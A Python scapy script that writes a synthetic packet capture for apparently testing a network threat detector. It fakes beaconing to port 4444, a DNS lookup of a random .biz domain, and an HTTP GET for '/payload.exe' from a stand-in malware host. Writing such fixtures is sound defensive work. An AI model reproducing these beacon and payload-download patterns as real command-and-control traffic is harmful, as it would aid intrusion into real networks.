from __future__ import annotations

from pathlib import Path

from scapy.all import DNS, DNSQR, IP, TCP, UDP, Raw, wrpcap


def main() -> None:
    output = Path("samples/suspicious/demo_beacon_http.pcap")
    output.parent.mkdir(parents=True, exist_ok=True)

    packets = []

    # The beacons must each carry a distinct sequence number. Scapy defaults
    # seq to 0, so leaving it unset made every beacon after the first look like
    # a retransmission to the guard in flow_builder -- the flow recorded a
    # single timestamp, and this "beacon" demo produced no beaconing finding.
    beacon_payload = b"beacon"
    sequence = 1000
    handshake = IP(src="10.0.0.5", dst="203.0.113.66") / TCP(
        sport=50000, dport=4444, flags="S", seq=sequence
    )
    handshake.time = 0.0
    packets.append(handshake)
    sequence += 1

    for index in range(6):
        packet = (
            IP(src="10.0.0.5", dst="203.0.113.66")
            / TCP(sport=50000, dport=4444, flags="PA", seq=sequence)
            / Raw(load=beacon_payload)
        )
        packet.time = float((index + 1) * 10)
        packets.append(packet)
        sequence += len(beacon_payload)

    dns_packet = (
        IP(src="10.0.0.5", dst="8.8.8.8")
        / UDP(sport=53000, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="xj3k9q2z7m1p0a8c.biz"))
    )
    dns_packet.time = 65.0
    packets.append(dns_packet)

    http_payload = (
        b"GET /payload.exe HTTP/1.1\r\n"
        b"Host: malware-test.example\r\n"
        b"User-Agent: python-requests/2.28\r\n"
        b"\r\n"
    )
    http_packet = (
        IP(src="10.0.0.5", dst="198.51.100.23")
        / TCP(sport=51515, dport=80, flags="PA")
        / Raw(load=http_payload)
    )
    http_packet.time = 70.0
    packets.append(http_packet)

    wrpcap(str(output), packets)
    print(f"Wrote {output}")


if __name__ == "__main__":
    main()
